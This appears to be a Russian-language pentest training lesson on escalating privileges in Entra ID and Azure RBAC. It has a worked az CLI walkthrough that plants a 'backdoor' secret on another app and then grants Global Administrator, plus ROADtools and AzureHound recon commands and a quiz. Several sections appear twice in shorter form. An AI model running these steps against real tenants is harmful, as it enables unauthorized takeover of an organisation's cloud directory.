---
id: cloud-azure-iam
title: "Entra ID и Azure RBAC: злоупотребление ролями и назначениями"
category: cloud
parent: cloud-iam-identity
difficulty: hard
order: 2
tags: [cloud, azure, entra-id, aad, rbac, privesc, service-principal, graph]
prerequisites: [cloud-azure-basics, cloud-iam-basics]
useful_for:
  - "Эскалация привилегий в Azure/Entra ID"
  - "Анализ app registrations и Microsoft Graph permissions"
  - "Атаки на гибридные AD + Entra ID среды"
estimated_minutes: 40
summary: "Как читать и злоупотреблять правами в Entra ID и Azure RBAC: роли, app permissions, административные unit'ы, гибридные связи с on-prem AD и типовые пути эскалации."
---

## Зачем этот урок

Azure RBAC и Entra ID дают **две независимые модели прав**, и почти все серьёзные находки рождаются на их стыке. Пользователь с «безобидной» ролью в Entra ID может выдать себе `Owner` на подписку; `Contributor` на VM превращается в доступ к секретам; гибридный аккаунт из on-prem AD синхронизируется в облако и наследует облачные роли.

Этот урок — про то, как читать эти права и превращать их в эскалацию.

## Две модели прав

1. **Azure RBAC** — что можно делать с **ресурсами** (`Microsoft.Compute/*`, `Microsoft.KeyVault/vaults/*`). Роли: `Owner`, `Contributor`, `User Access Administrator`, кастомные.
2. **Entra ID roles** — что можно делать в **каталоге** (`Global Administrator`, `Application Administrator`, `Privileged Role Administrator`, `User Administrator`). Управляются в Entra ID, не в RBAC.

Плюс третья модель, которую все забывают:

3. **Microsoft Graph app permissions** — что может делать **приложение** (`Directory.ReadWrite.All`, `AppRoleAssignment.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`). Секрет такого приложения — почти всегда полный контроль над тенантом.

## Ключевые привилегированные роли и почему они опасны

| Роль | Почему критична |
|------|-----------------|
| `Global Administrator` | Полный контроль над Entra ID; может выдать любую роль |
| `Privileged Role Administrator` | Может выдать себе `Global Admin` |
| `Application Administrator` | Может добавить credentials в **любое** приложение → захватить его права |
| `Cloud Application Administrator` | То же для облачных приложений |
| `User Administrator` | Сброс паролей, включая privileged-пользователей |
| `Authentication Administrator` | Сброс MFA, временных паролей |
| `Hybrid Identity Administrator` | Может настроить федерацию/синхронизацию → полный захват |
| `Owner` (RBAC) | Выдать любые RBAC-роли в своём scope |
| `User Access Administrator` (RBAC) | Управление назначениями ролей |

**Главный приём**: `Application Administrator` не даёт напрямую `Global Admin`, но позволяет **добавить client secret к приложению**, у которого уже есть `Directory.ReadWrite.All` или `RoleManagement.ReadWrite.Directory`. Дальше — от имени приложения выдаём себе админ-роль. Это классический Entra-эскалационный путь.

## Service principal и app registration

Приложение (`app registration`) описывает **что** приложение хочет. Service principal — это его **экземпляр в тенанте**, которому выданы роли. Секреты/сертификаты — способ аутентификации.

Атаки на этом слое:

- **Добавить секрет к чужому приложению** (нужны права `Application Administrator` или `owner` приложения):
  ```bash
  az ad app credential reset --id <APP_ID> --append --years 1
  ```
- **Выдать приложению высокие Graph permissions** и согласовать (admin consent) — если есть `AppRoleAssignment.ReadWrite.All` + `Directory.ReadWrite.All`.
- **Захватить существующее приложение** с уже согласованными правами — самый тихий путь.

## Инструменты: ROADtools и AzureHound

```bash
pip install roadtools

# Аутентификация (устройство refresh-токена)
roadrecon auth -u user@tenant.onmicrosoft.com -p 'Passw0rd!'
roadrecon gather        # собирает users/groups/apps/roles
roadrecon gui           # локальный веб-интерфейс для анализа

# AzureHound → граф для BloodHound
azurehound -u user@tenant.onmicrosoft.com -p 'Passw0rd!' list \
  --tenant tenant.onmicrosoft.com -o azure.json
```

```bash
# Перечисление ролей и назначений через CLI
az role assignment list --all -o table
az ad app list --all -o table
az ad sp list --all -o table
az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=999"
```

## Разобранный пример: от Application Administrator до Global Admin

Исходные данные: есть пользователь `alice@corp.onmicrosoft.com` с ролью `Application Administrator` (и пароль к нему).

1. Подтверждаем роль:
   ```bash
   az rest --method GET --url "https://graph.microsoft.com/v1.0/me/memberOf"
   ```
2. Ищем приложение с уже согласованным `Directory.ReadWrite.All`:
   ```bash
   az ad sp list --all --query "[?appRoles!=null]" -o table
   az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=displayName eq 'Graph Delegated App'"
   ```
3. Добавляем себе секрет к этому приложению:
   ```bash
   az ad app credential reset --id <APP_ID> --append --display-name backdoor --years 1
   ```
4. Аутентифицируемся как это приложение:
   ```bash
   az login --service-principal -u <APP_ID> -p '<NEW_SECRET>' --tenant <TID>
   ```
5. От имени приложения выдаём `Global Administrator` пользователю `alice`:
   ```bash
   az rest --method POST \
     --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
     --body '{"principalId":"<ALICE_OBJECT_ID>","roleDefinitionId":"<GLOBAL_ADMIN_ROLE_ID>","directoryScopeId":"/"}'
   ```
6. Проверяем — теперь `alice` глобальный админ. Захват завершён.

## Гибридные среды: on-prem AD ↔ Entra ID

В гибридных компаниях Entra ID синхронизируется с on-prem Active Directory через **Entra Connect** (бывш. AAD Connect). Это даёт мощные пути:

- **`Hybrid Identity Administrator`** может настроить **federation** (ADFS/PTA) и тем самым подделать аутентификацию любого пользователя в тенанте.
- **Синхронизируемые аккаунты**: скомпрометировав on-prem пользователя с облачными ролями, вы получаете и облако.
- **Аккаунт службы синхронизации (AD DS Connector Account)** имеет `Replicate Directory Changes` в on-prem AD — компрометация этого аккаунта ведёт к DCSync.

Практика: собрав граф AzureHound, ищите «мосты» между on-prem группами и облачными ролями.

## Частые ошибки

- **Игнорировать гостей.** Guest-пользователь с привилегированной ролью — реальная эскалация.
- **Путать app permission и delegated permission.** Application permissions (app-only) опаснее — они не требуют пользователя в сессии.
- **Не проверять `owner` приложений.** Владелец app registration может добавить секрет, даже не имея admin-роли в Entra ID.
- **Забыть про PIM.** Роли в Privileged Identity Management могут быть «eligible» (активируются по запросу) — их не видно в простом `role assignment list`, нужен отдельный анализ.
- **Считать, что нет прав = нет пути.** Conditional Access, MFA, PIM — это дополнительные двери, а не стены.

## Две модели прав

Entra ID (бывший Azure AD) управляет идентичностями (пользователи, группы, приложения) и ролями каталога (Global Admin, Application Admin). Azure RBAC управляет доступом к ресурсам (Reader, Contributor, Owner) через role assignments на scope (management group/subscription/resource group/resource).

## Опасные роли

| Роль | Почему опасна |
|------|---------------|
| Global Administrator | полный контроль каталога |
| Privileged Role Administrator | выдаёт любые роли |
| Application Administrator | credentials к приложениям |
| User Access Administrator | назначает RBAC |
| Owner (subscription) | всё в подписке |
| Contributor | создаёт ресурсы, эскалирует |

## Service principal и app registration

App registration имеет credentials (secret/certificate) и API-разрешения. Скомпрометировав secret, вы действуете от имени приложения — часто с широкими правами (например, `Directory.ReadWrite.All`).

## Инструменты: ROADtools и AzureHound

```bash
roadrecon auth -u user@tenant -p pass
roadrecon gather
roadrecon gui
azurehound -u user -p pass list -o azure.json
# BloodHound для Azure
```

## Разобранный пример: от Application Administrator до Global Admin

1. Роль `Application Administrator` позволяет добавлять credentials к приложениям.
2. Находим приложение с ролью `Global Administrator` (или с правами на каталог).
3. Добавляем свой secret: `az ad app credential reset --id <app-id>`.
4. Входим как приложение → получаем его права.
5. Через них выдаём себе Global Admin.

## Гибридные среды

AD Connect синхронизирует on-prem AD ↔ Entra ID. Компромисс on-prem AD часто = компромисс Entra ID (например, через `MSOL_`-аккаунт или синхронизируемые привилегированные группы). Проверяйте sync-аккаунты и объекты с `adminCount`.

## Частые ошибки

- Игнорировать Entra ID, смотря только на Azure RBAC.
- Не проверять API-разрешения приложений.
- Забывать про гибридные пути.
- Считать `Contributor` безобидным (он эскалирует).

## Квиз

```quiz
- question: "Почему роль Application Administrator в Entra ID может вести к полному контролю тенанта?"
  options:
    - "Она даёт доступ к биллингу"
    - "Она позволяет добавить секрет к любому приложению, включая приложения с высокими Graph permissions"
    - "Она автоматически выдаёт Global Administrator"
    - "Она даёт root на все VM"
  answer: 1
  explanation: "Добавив credential чужому приложению с высокими правами, вы действуете от его имени — тихая эскалация."
- question: "Какая команда добавляет новый client secret к app registration?"
  options:
    - "az ad sp create-for-rbac"
    - "az ad app credential reset --id <APP_ID> --append"
    - "az role assignment create"
    - "az login --service-principal"
  answer: 1
  explanation: "credential reset с --append добавляет новый секрет, не удаляя существующие."
- question: "Чем application permission (app-only) опаснее delegated permission?"
  options:
    - "Он требует MFA"
    - "Он действует без пользовательской сессии — приложение обращается к Graph само"
    - "Он только для чтения"
    - "Он не даёт прав"
  answer: 1
  explanation: "App-only permissions не привязаны к вошедшему пользователю — захват приложения сразу даёт его права."
- question: "Какой облачный администратор может настроить федерацию и тем самым подделать вход любого пользователя?"
  options:
    - "User Administrator"
    - "Hybrid Identity Administrator"
    - "Reader"
    - "Storage Blob Data Owner"
  answer: 1
  explanation: "Hybrid Identity Administrator управляет синхронизацией и федерацией — это прямой путь к захвату аутентификации."
- question: "Почему роли в PIM могут быть не видны в простом списке role assignment?"
  options:
    - "PIM скрывает все роли навсегда"
    - "Роли могут быть eligible и активируются только по запросу"
    - "PIM работает только в AWS"
    - "PIM удаляет роли"
  answer: 1
  explanation: "Eligible-роли активируются по требованию, поэтому в активных назначениях их нет."
```

## Где пригодится

- **Пентест Azure/Entra ID** — основа эскалации в Microsoft-облаке.
- **Red team** — пути от пользователя к Global Admin.
- **IR/Blue team** — детект добавления секретов к приложениям и выдачи ролей.
- **Bug bounty** — программы Microsoft и корпоративные тенанты.
- **Сертификации** — SC-300, AZ-500.
